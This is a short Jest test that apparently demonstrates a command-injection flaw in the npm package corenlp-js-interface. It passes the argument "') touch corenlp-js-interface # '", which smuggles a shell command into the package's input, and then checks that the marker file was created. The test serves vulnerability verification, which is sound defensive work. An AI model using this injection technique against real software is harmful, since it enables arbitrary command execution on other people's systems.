test("Command Injection in corenlp-js-interface", () => {
  expect.assertions(2);
  const a = require("corenlp-js-interface");
  const fs = require("fs");
  const path = "./corenlp-js-interface";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  a("') touch corenlp-js-interface # '", "", "", "");
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
